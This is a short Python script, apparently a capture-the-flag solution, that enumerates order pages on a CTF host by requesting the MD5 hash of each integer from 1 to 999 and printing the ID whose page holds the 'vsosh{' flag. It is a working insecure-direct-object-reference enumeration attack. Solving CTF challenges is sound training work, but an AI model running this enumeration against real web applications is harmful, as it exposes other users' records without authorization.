import hashlib, requests
print(hashlib.md5('54'.encode()).hexdigest())
s = requests.Session()
url = 'https://2991ce26-1559-4bd3-919f-e5c9a97aa3bd.ctf.ctfinf.ru/orders/'
for x in range(1, 1000):
    id = hashlib.md5(str(x).encode()).hexdigest()
    gt = s.get(url + id)
    if 'vsosh{' in gt.text:
        print(x, id)